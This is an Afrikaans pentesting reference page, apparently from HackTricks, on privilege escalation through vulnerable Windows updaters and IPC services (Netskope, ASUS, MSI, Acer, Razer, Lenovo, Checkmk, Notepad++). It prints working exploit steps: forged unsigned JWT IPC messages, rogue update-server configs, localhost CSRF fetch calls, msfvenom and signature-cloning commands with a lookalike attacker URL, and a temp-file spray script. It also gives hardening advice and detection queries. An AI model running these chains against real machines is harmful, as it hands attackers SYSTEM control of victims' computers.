# Misbruik van Enterprise Auto-Updaters en Privileged IPC (bv., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Hierdie bladsy veralgemeen ’n klas Windows local privilege escalation-kettings wat in enterprise endpoint agents en updaters gevind word, waar ’n maklik toeganklike IPC-oppervlak en ’n privileged update flow blootgestel word. ’n Verteenwoordigende voorbeeld is Netskope Client for Windows < R129 (CVE-2025-0309), waar ’n low-privileged user enrollment na ’n attacker-controlled server kan afdwing en daarna ’n malicious MSI kan lewer wat deur die SYSTEM-service geïnstalleer word.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Belangrike idees wat jy teen soortgelyke produkte kan hergebruik:
- Abuse ’n privileged service se localhost IPC om re-enrollment of reconfiguration na ’n attacker-server af te dwing.
- Implementeer die vendor se update endpoints, lewer ’n rogue Trusted Root CA, en wys die updater na ’n malicious, “signed” package.
- Omseil swak signer checks (CN allow-lists), optional digest flags en lax MSI properties.
- As IPC “encrypted” is, deriveer die key/IV uit world-readable machine identifiers wat in die registry gestoor word.
- As die service callers volgens image path/process name beperk, inject in ’n allow-listed process of spawn een suspended en bootstrap jou DLL via ’n minimal thread-context patch.

---
## 1) Force enrollment na ’n attacker-server via localhost IPC

Baie agents bevat ’n user-mode UI-process wat met ’n SYSTEM-service oor localhost TCP kommunikeer deur JSON te gebruik.

Waargeneem in Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) Craft ’n JWT enrollment token waarvan die claims die backend host beheer (bv. AddonUrl). Gebruik alg=None sodat geen signature vereis word nie.
2) Stuur die IPC-boodskap wat die provisioning command invokeer met jou JWT en tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Die diens begin jou rogue server kontak vir enrollment/config, byvoorbeeld:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notas:
- Indien caller verification op path/name gebaseer is, originateer die request vanaf ’n allow-listed vendor binary (sien §4).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) Hijacking van die update channel om code as SYSTEM uit te voer

Sodra die client met jou server kommunikeer, implementeer die verwagte endpoints en stuur dit na ’n attacker MSI. Tipiese sequence:

1) /v2/config/org/clientconfig → Return JSON config met ’n baie kort updater interval, byvoorbeeld:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Return 'n PEM CA certificate. Die service installeer dit in die Local Machine Trusted Root store.
3) /v2/checkupdate → Voorsien metadata wat na 'n malicious MSI en 'n fake version wys.

Omseiling van algemene checks wat in die praktyk voorkom:
- Signer CN allow-list: die service kan dalk net kontroleer of die Subject CN gelyk is aan “netSkope Inc” of “Netskope, Inc.”. Jou rogue CA kan 'n leaf met daardie CN uitreik en die MSI sign.
- CERT_DIGEST property: sluit 'n benign MSI property genaamd CERT_DIGEST in. Geen enforcement tydens installasie nie.
- Optional digest enforcement: config flag (bv. check_msi_digest=false) disableer addisionele cryptographic validation.

Resultaat: die SYSTEM service installeer jou MSI vanaf
C:\ProgramData\Netskope\stAgent\data\*.msi
wat arbitrary code as NT AUTHORITY\SYSTEM uitvoer.<sup>[[1]](#references)[[2]](#references)</sup>

Patch-bypass-les: as 'n vendor reageer deur 'n klein stel “trusted” domains toe te laat in plaas daarvan om die update source cryptographically te authenticate, soek na vendor-owned redirectors of reverse proxies wat jou steeds toelaat om traffic te stuur. In Netskope se geval het openbare follow-up research getoon dat 'n R129-era allow-list steeds misbruik kon word deur `rproxy.goskope.com`, wat attacker-controlled Azure App Service content geproxy het. Behandel hostname allow-lists as 'n spoedhobbel, nie as 'n trust boundary nie.<sup>[[14]](#references)</sup>

---
## 3) Forging van encrypted IPC requests (wanneer teenwoordig)

Vanaf R127 het Netskope IPC JSON in 'n encryptData field toegedraai wat soos Base64 lyk. Reversing het AES getoon, met key/IV wat afgelei word van registry values wat deur enige user gelees kan word:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers kan encryption reproduceer en valid encrypted commands vanaf 'n standard user stuur.<sup>[[1]](#references)[[2]](#references)</sup> Algemene wenk: as 'n agent skielik sy IPC “encrypt”, soek na device IDs, product GUIDs en install IDs onder HKLM as material.

---
## 4) Omseiling van IPC caller allow-lists (path/name checks)

Sommige services probeer die peer authenticateer deur die TCP connection se PID op te los en die image path/name te vergelyk met allow-listed vendor binaries wat onder Program Files geleë is (bv. stagentui.exe, bwansvc.exe, epdlp.exe).

Twee praktiese bypasses:
- DLL injection in 'n allow-listed process (bv. nsdiag.exe) en proxy IPC van binne dit.
- Spawn 'n allow-listed binary suspended en bootstrap jou proxy DLL sonder CreateRemoteThread (sien §5) om driver-enforced tamper rules te satisfy.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Tamper-protection-vriendelike injection: suspended process + NtContinue patch

Products lewer dikwels 'n minifilter/OB callbacks driver (bv. Stadrv) wat dangerous rights van handles na protected processes strip:
- Process: verwyder PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: beperk dit tot THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

'n Betroubare user-mode loader wat hierdie constraints respekteer:
1) CreateProcess van 'n vendor binary met CREATE_SUSPENDED.
2) Kry die handles waartoe jy steeds toegelaat word: PROCESS_VM_WRITE | PROCESS_VM_OPERATION op die process, en 'n thread handle met THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (of net THREAD_RESUME as jy code by 'n bekende RIP patch).
3) Oorskryf ntdll!NtContinue (of 'n ander vroeë, gewaarborgde-mapped thunk) met 'n klein stub wat LoadLibraryW op jou DLL path call, en dan terug spring.
4) ResumeThread om jou stub in-process te trigger, wat jou DLL laai.

Omdat jy nooit PROCESS_CREATE_THREAD of PROCESS_SUSPEND_RESUME op 'n reeds-protected process gebruik het nie (jy het dit geskep), word die driver se policy nagekom.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Praktiese tooling
- NachoVPN (Netskope plugin) automateer 'n rogue CA, malicious MSI signing, en serveer die nodige endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope is 'n custom IPC client wat arbitrary (optionally AES-encrypted) IPC messages craft en die suspended-process injection insluit om van 'n allow-listed binary afkomstig te wees.<sup>[[4]](#references)</sup>

## 7) Vinnige triage-workflow vir onbekende updater/IPC surfaces

Wanneer jy met 'n nuwe endpoint agent of motherboard “helper”-suite werk, is 'n vinnige workflow gewoonlik genoeg om te bepaal of jy na 'n belowende privesc target kyk:<sup>[[6]](#references)</sup>

1) Enumerate loopback listeners en map hulle terug na vendor processes:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Lys kandidaat named pipes:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Ontgin registry-backed roeteringsdata wat deur plugin-based IPC servers gebruik word:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Onttrek eers endpoint names, JSON keys en command IDs uit die user-mode client. Verpakte Electron/.NET frontends lek dikwels die volledige skema:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Soek die werklike trust-predikaat, nie net die kodepad wat uiteindelik die proses begin nie:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Patrone wat die moeite werd is om te prioritiseer:
- `CryptQueryObject`/sertifikaatontleding sonder `WinVerifyTrust` beteken gewoonlik dat “sertifikaat bestaan” as “sertifikaat is vertrou” behandel is, wat sertifikaatkloning of ander fake-signer-truuks moontlik maak.
- Substring-/agtervoegselkontroles oor `Origin`, `Referer`, download-URL'e, prosesname of signer CN's is nie authentication nie. `contains(".vendor.com")` is gewoonlik exploiteerbaar met aanvaller-beheerde lookalike-domains.
- As die lae-bevoorregte GUI besluit “die lêer is vertrou” en die SYSTEM broker bloot daardie resultaat gebruik, omseil die patching of herimplementering van die client-side DLL/JS dikwels die grens heeltemal (Razer-styl split validation).
- As die broker 'n payload na `%TEMP%`/`C:\Windows\Temp` kopieer en dit dan vanaf daardie pad valideer of skeduleer, toets onmiddellik vir TOCTOU-vervangingsvensters en vir sibling plugin-modules wat alternatiewe `ExecuteTask()`-wrappers met swakker kontroles blootstel.<sup>[[6]](#references)</sup>

Vir named-pipe-swaar targets is PipeViewer 'n vinnige manier om swak DACL's en remotely reachable pipes raak te sien voordat jy die protokol in diepte begin reverse engineer.<sup>[[11]](#references)</sup>

As die target callers slegs volgens PID, image path of prosesnaam authenticate, behandel dit as 'n speed bump eerder as 'n grens: injecting in die legitieme client, of om die verbinding vanaf 'n allow-listed proses te maak, is dikwels genoeg om aan die server se kontroles te voldoen. Vir named pipes spesifiek dek [hierdie bladsy oor client impersonation en pipe abuse](named-pipe-client-impersonation.md) die primitive in meer diepte.

---
## 8) Modulêre add-in brokers wat slegs deur vendor signatures geauthenticate word (Lenovo Vantage-patroon)

'n Nuwer variasie wat die moeite werd is om na te vors, is die **signed-client RPC broker**: 'n lae-bevoorregte Lenovo-signed desktop-proses kommunikeer met 'n SYSTEM-service, en die service roeteer JSON-commands na 'n stel XML-beskrewe add-ins onder `%ProgramData%`. Sodra code execution **binne enige aanvaarbare signed client** bereik is, word elke `runas="system"`-kontrak deel van jou attack surface.<sup>[[15]](#references)</sup>

Hoëwaarde-primitives wat in Lenovo Vantage-navorsing waargeneem is:
- **Vertrou die caller omdat dit deur die vendor signed is**: navorsers het 'n geauthentiseerde konteks bereik deur 'n Lenovo-signed EXE na 'n writable directory te kopieer en 'n DLL side-load (`profapi.dll`) te laat slaag, sodat arbitrêre code binne 'n client wat reeds deur die service vertrou is, kon loop.
- **Manifest-gedrewe attack-surface discovery**: add-ins word onder `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` verklaar; verskeie kontrakte loop as `SYSTEM`, dus onthul die enumerering van daardie manifests dikwels die werklike bevoorregte verbs vinniger as reverse engineering van die broker self.
- **Per-command-bugs agter die geauthentiseerde kanaal**: nadat jy binne die trusted client is, het openbare navorsing path-traversal + race conditions in update/install-verbs, raw-SQL-abuse in bevoorregte settings-databasisse, en substring-gebaseerde registry path-kontroles gevind wat writes buite die bedoelde hive moontlik gemaak het.

Nuttige recon op 'n target:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Praktiese gevolgtrekking: wanneer ’n helper suite ’n broker blootstel wat eers die **caller process** autentiseer en daarna tientalle plugin/add-in-opdragte uitvoer, moenie ophou nadat jy die front-door trust check omseil het nie. Dump die manifest/contract table en fuzz elke high-privilege verb onafhanklik; die geauthentiseerde kanaal verberg gewoonlik verskeie second-stage-bugs.

---
## 1) Browser-to-localhost CSRF teen bevoorregte HTTP APIs (ASUS DriverHub)

DriverHub lewer ’n user-mode HTTP-service (ADU.exe) op 127.0.0.1:53000 wat browser-oproepe verwag wat van https://driverhub.asus.com afkomstig is. Die origin filter voer bloot `string_contains(".asus.com")` uit oor die Origin-header en oor download-URLs wat deur `/asus/v1.0/*` blootgestel word. Enige aanvaller-beheerde host soos `https://driverhub.asus.com.attacker.tld` slaag dus die kontrole en kan state-changing requests vanuit JavaScript uitreik.<sup>[[6]](#references)</sup> Sien [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) vir bykomende bypass-patrone.

Praktiese vloei:
1) Registreer ’n domein wat `.asus.com` insluit en host ’n kwaadwillige webblad daar.
2) Gebruik `fetch` of XHR om ’n bevoorregte endpoint (byvoorbeeld `Reboot`, `UpdateApp`) op `http://127.0.0.1:53000` aan te roep.
3) Stuur die JSON-body wat die handler verwag – die packed frontend JS wys die schema hieronder.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Selfs die PowerShell CLI wat hieronder gewys word, slaag wanneer die Origin header na die vertroude waarde gespoof word:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Enige blaaierbesoek aan die aanvaller se webwerf word dus ’n 1-click (of 0-click via `onload`) local CSRF wat ’n SYSTEM-helper aandryf.

---
## 2) Onveilige code-signing-verifikasie & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` laai arbitrêre uitvoerbare lêers af wat in die JSON-body gedefinieer word en kas hulle in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. URL-validasie vir downloads hergebruik dieselfde substring-logika, dus word `http://updates.asus.com.attacker.tld:8000/payload.exe` aanvaar. Ná die download kontroleer ADU.exe bloot of die PE ’n signature bevat en of die Subject-string met ASUS ooreenstem voordat dit dit uitvoer – geen `WinVerifyTrust` of chain validation nie.

Om die vloei te weaponize:
1) Create ’n payload (bv. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone ASUS se signer daarin (bv. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Host `pwn.exe` op ’n `.asus.com` lookalike domain en trigger UpdateApp via die browser CSRF hierbo.

Omdat beide die Origin- en URL-filters op substrings gebaseer is en die signer-check slegs strings vergelyk, haal DriverHub die aanvaller se binary af en voer dit binne sy elevated context uit.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU binne updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center se SYSTEM-service stel ’n TCP-protokol bloot waar elke frame `4-byte ComponentID || 8-byte CommandID || ASCII arguments` is. Die kernkomponent (Component ID `0f 27 00 00`) bevat `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Sy handler:
1) Kopieer die supplied executable na `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifieer die signature via `CS_CommonAPI.EX_CA::Verify` (certificate subject moet gelyk wees aan “MICRO-STAR INTERNATIONAL CO., LTD.” en `WinVerifyTrust` moet suksesvol wees).
3) Skep ’n scheduled task wat die temp-lêer as SYSTEM met attacker-controlled arguments uitvoer.

Die gekopieerde lêer word nie tussen verification en `ExecuteTask()` gelock nie. ’n Aanvaller kan:
- Frame A stuur wat na ’n legitimate MSI-signed binary wys (verseker dat die signature-check slaag en die task queued word).
- Dit met herhaalde Frame B-boodskappe race wat na ’n malicious payload wys en `MSI Center SDK.exe` net ná voltooiing van die verification oorskryf.

Wanneer die scheduler aktiveer, voer dit die oorskryfde payload as SYSTEM uit, ondanks die feit dat die oorspronklike lêer validated is. Betroubare exploitation gebruik twee goroutines/threads wat CMD_AutoUpdateSDK spam totdat die TOCTOU-window gewen word.<sup>[[6]](#references)</sup>

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Elke plugin/DLL wat deur `MSI.CentralServer.exe` gelaai word, ontvang ’n Component ID wat onder `HKLM\SOFTWARE\MSI\MSI_CentralServer` gestoor word. Die eerste 4 bytes van ’n frame kies daardie component, wat attackers toelaat om commands na arbitrêre modules te routeer.
- Plugins kan hul eie task runners definieer. `Support\API_Support.dll` stel `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` bloot en roep `API_Support.EX_Task::ExecuteTask()` direk aan met **geen** signature validation nie – enige local user kan dit na `C:\Users\<user>\Desktop\payload.exe` wys en deterministiese SYSTEM execution verkry.
- Deur loopback met Wireshark te sniff of die .NET-binaries in dnSpy te instrumenteer, word die Component ↔ command mapping vinnig onthul; custom Go/ Python-clients kan dan frames replay.<sup>[[6]](#references)</sup>

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) stel `\\.\pipe\treadstone_service_LightMode` bloot, en sy discretionary ACL laat remote clients toe (bv. `\\TARGET\pipe\treadstone_service_LightMode`). Deur command ID `7` met ’n file path te stuur, word die service se process-spawning routine invoked.
- Die client library serialize ’n magic terminator byte (113) saam met args. Dynamic instrumentation met Frida/`TsDotNetLib` (sien [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) vir instrumentation-wenke) wys dat die native handler hierdie waarde na ’n `SECURITY_IMPERSONATION_LEVEL` en integrity SID map voordat dit `CreateProcessAsUser` aanroep.
- Deur 113 (`0x71`) met 114 (`0x72`) te vervang, val dit in die generic branch wat die volledige SYSTEM-token behou en ’n high-integrity SID (`S-1-16-12288`) stel. Die spawned binary loop dus as unrestricted SYSTEM, plaaslik sowel as cross-machine.
- Kombineer dit met die blootgestelde installer-flag (`Setup.exe -nocheck`) om ACC selfs op lab-VMs op te stel en die pipe sonder vendor hardware te exercise.<sup>[[6]](#references)</sup>

Hierdie IPC-bugs beklemtoon waarom localhost-services mutual authentication moet afdwing (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) en waarom elke module se “run arbitrary binary”-helper dieselfde signer verifications moet deel.

---
## 3) COM/IPC “elevator”-helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 het nog ’n nuttige pattern tot hierdie family bygevoeg: ’n low-privileged user kan ’n COM-helper vra om ’n process deur `RzUtility.Elevator` te launch, terwyl die trust decision aan ’n user-mode DLL (`simple_service.dll`) gedelegeer word eerder as dat dit robuust binne die privileged boundary afgedwing word.

Waargenome exploitation path:
- Instantiate die COM-object `RzUtility.Elevator`.
- Call `LaunchProcessNoWait(<path>, "", 1)` om ’n elevated launch te versoek.
- In die public PoC word die PE-signature gate binne `simple_service.dll` uitgepatch voordat die request uitgereik word, waardeur ’n arbitrêre executable wat deur die aanvaller gekies is, gelaunch kan word.<sup>[[6]](#references)</sup>

Minimal PowerShell-invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Algemene gevolgtrekking: wanneer jy “helper”-suites reverse-engineer, moenie by localhost TCP of named pipes stop nie. Kyk vir COM-klasse met name soos `Elevator`, `Launcher`, `Updater` of `Utility`, en verifieer dan of die geprivilegeerde diens werklik die teikenbinêre self valideer, of bloot ’n resultaat vertrou wat deur ’n patchbare user-mode client DLL bereken is. Hierdie patroon veralgemeen verder as Razer: enige gesplete ontwerp waar die high-privilege broker ’n allow/deny-besluit van die low-privilege-kant gebruik, is ’n kandidaat-privesc-oppervlak.


---
## Voorspelbare uitvoering van temp-skripte tydens MSI repair (Checkmk Agent / CVE-2024-0670)

Sommige Windows-agente implementeer steeds geprivilegeerde aksies deur ’n tydelike `.cmd` in `C:\Windows\Temp` te skryf en dit as `SYSTEM` uit te voer. As die lêernaam voorspelbaar is en die diens nie bestaande lêers veilig herskep nie, kan ’n low-privilege-gebruiker die toekomstige temp-lêer vooraf as **read-only** skep en die geprivilegeerde proses aanvaller-beheerde inhoud laat uitvoer in plaas van sy eie skrip.

Waargeneem in kwesbare Checkmk Agent-bouweergawes:
- temp-patroon: `cmk_all_<PID>_1.cmd`
- geaffekteerde vertakkings: `2.0.0`, `2.1.0`, `2.2.0`
- sneller: MSI **repair** van die gecachede agent-pakket<sup>[[8]](#references)[[9]](#references)</sup>

Praktiese werkvloei:
1. Skat ’n realistiese PID-reeks op grond van huidige proses-ID’s of die lopende agent se PID.
2. Skryf ’n kort **ASCII** `.cmd`-payload (`Set-Content -Encoding Ascii` of `cmd.exe`-redirection; vermy UTF-16 PowerShell-uitvoer vir batch-lêers).
3. Spray `C:\Windows\Temp\cmk_all_<PID>_1.cmd` oor die kandidaat-reeks en merk elke lêer as read-only.
4. Trigger ’n repair van die gecachede MSI sodat die geprivilegeerde diens probeer om die temp-skrip te herskep en dit daarna uitvoer.<sup>[[7]](#references)</sup>
```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```
Indien die kwesbare produk met Windows Installer geïnstalleer is, koppel die ewekansig lykende gekasde MSI onder `C:\Windows\Installer` terug aan sy produknaam voordat die herstel geaktiveer word:<sup>[[7]](#references)</sup>
```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
ForEach-Object {
$p = Get-ItemProperty $_.PSPath
[PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
} | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```
Operasionele notas:
- `qwinsta` is nuttig wanneer `msiexec /fa` vanuit ’n nie-interaktiewe WinRM-shell misluk en jy moet verstaan of ’n bestaande desktop-/ontkoppelde sessie die herstelproses korrek kan aktiveer.<sup>[[7]](#references)</sup>
- Hierdie patroon veralgemeen na ander endpoint-agents en updaters wat **tydelike scripts in wêreldskryfbare liggings opstel en dit later as SYSTEM uitvoer**. Toets vir voorspelbare name, ontbrekende eksklusiewe create-semantiek, en herstel-/update-vloeie wat op aanvraag geaktiveer kan word.

---
## Remote supply-chain hijack via swak updater-validasie (WinGUp / Notepad++)

Tussen Junie 2025 en Desember 2025 het aanvallers wat die hosting-infrastruktuur agter die Notepad++-update-vloei gekompromitteer het, selektief malicious manifests aan gekose slagoffers bedien. Ouer WinGUp-gebaseerde updaters het nie die egtheid van updates volledig geverifieer nie, sodat ’n hostile XML-response clients na attacker-beheerde URLs kon herlei. Omdat die client HTTPS-inhoud aanvaar het sonder om beide ’n trusted certificate chain en ’n geldige PE-signature op die afgelaaide installer af te dwing, het slagoffers ’n trojanized NSIS `update.exe` afgelaai en uitgevoer.<sup>[[12]](#references)[[13]](#references)</sup>

Operational flow (geen local exploit benodig nie):
1. **Infrastructure interception**: kompromitteer CDN/hosting en beantwoord update checks met attacker-metadata wat na ’n malicious download URL wys.
2. **Trojanized NSIS**: die installer haal ’n payload op en voer dit uit, en misbruik twee execution chains:
- **Bring-your-own signed binary + sideload**: bundel die signed Bitdefender `BluetoothService.exe` en plaas ’n malicious `log.dll` in sy search path. Wanneer die signed binary loop, sideload Windows `log.dll`, wat die Chrysalis backdoor decrypt en reflectively laai (Warbird-protected + API hashing om static detection te bemoeilik).
- **Scripted shellcode injection**: NSIS voer ’n compiled Lua-script uit wat Win32 APIs (bv. `EnumWindowStationsW`) gebruik om shellcode te inject en Cobalt Strike Beacon te stage.<sup>[[12]](#references)</sup>

Hardening/detection-gevolgtrekkings vir enige auto-updater:
- Dwing **certificate + signature verification** van die afgelaaide installer af (pin die vendor signer, reject mismatched CN/chain) en sign die update manifest self (bv. XMLDSig). Block manifest-controlled redirects tensy dit gevalideer is.
- Behandel **BYO signed binary sideloading** as ’n post-download detection pivot: alert wanneer ’n signed vendor EXE ’n DLL-naam buite sy canonical install path laai (bv. Bitdefender wat `log.dll` vanaf Temp/Downloads laai), en wanneer ’n updater installers vanaf temp drop/execute met non-vendor signatures.
- Monitor **malware-specific artifacts** wat in hierdie chain waargeneem is (nuttig as generiese pivots): mutex `Global\Jdhfv_1.0.1`, anomalous `gup.exe`-writes na `%TEMP%`, en Lua-driven shellcode injection stages.
- Notepad++ het gereageer deur WinGUp in v8.8.9 en later te versterk: die teruggestuurde XML is nou signed (XMLDSig), en nuwer builds dwing certificate + signature verification van die afgelaaide installer af in plaas daarvan om slegs die transport te vertrou.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> wat ’n nie-Notepad++-installeerder begin</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Hierdie patrone veralgemeen na enige updater wat unsigned manifests aanvaar of versuim om installer signers vas te pen—network hijack + malicious installer + BYO-signed sideloading lei tot remote code execution onder die dekmantel van “trusted” updates.

---
## Verwysings
- [1] [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Local Privilege Escalation via writable files in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Privilege escalation in Windows agent](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
